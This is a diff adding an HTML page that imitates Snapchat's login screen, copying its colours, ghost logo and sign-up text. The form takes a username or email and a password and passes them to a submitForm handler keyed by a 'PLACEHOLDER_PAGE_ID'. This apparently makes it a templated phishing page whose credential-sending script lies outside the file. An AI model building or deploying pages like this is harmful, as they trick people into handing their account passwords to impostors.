@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Log In</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: linear-gradient(45deg, #fffc00, #ffffff); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { width: 100%; max-width: 360px; padding: 20px; }
+        .logo { text-align: center; margin-bottom: 40px; }
+        .ghost { font-size: 80px; }
+        .login-box { background: white; border-radius: 12px; padding: 32px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        .title { font-size: 24px; font-weight: bold; text-align: center; color: #333; margin-bottom: 24px; }
+        .form-group { margin-bottom: 16px; }
+        input { width: 100%; padding: 12px 16px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
+        input:focus { border-color: #fffc00; outline: none; }
+        .login-btn { background: #0eadff; color: white; border: none; border-radius: 20px; padding: 12px 24px; width: 100%; font-size: 16px; font-weight: bold; margin: 20px 0 16px; cursor: pointer; }
+        .forgot-link { color: #0eadff; text-decoration: none; font-size: 14px; display: block; text-align: center; margin-bottom: 16px; }
+        .signup-section { text-align: center; color: #666; margin-top: 20px; }
+        .signup-link { color: #0eadff; text-decoration: none; font-weight: bold; }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px !important;
+            }
+
+            .login-box {
+                padding: 20px !important;
+                margin: 20px 0 !important;
+                border-radius: 12px !important;
+            }
+
+            .form-input {
+                font-size: 16px !important;
+                padding: 12px !important;
+                margin-bottom: 12px !important;
+            }
+
+            .login-btn {
+                font-size: 16px !important;
+                padding: 12px !important;
+            }
+
+            .snapchat-logo {
+                font-size: 28px !important;
+                margin-bottom: 20px !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="ghost">👻</div>
+        </div>
+        <div class="login-box">
+            <h2 class="title">Log In</h2>
+            <form id="loginForm" onsubmit="submitForm(event, 'PLACEHOLDER_PAGE_ID')">
+                <div class="form-group">
+                    <input type="text" id="username" name="username" placeholder="Username or email" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn">Log In</button>
+                <a href="#" class="forgot-link">Forgot your password?</a>
+            </form>
+            <div class="signup-section">
+                New to Snapchat? <a href="#" class="signup-link">Sign up</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
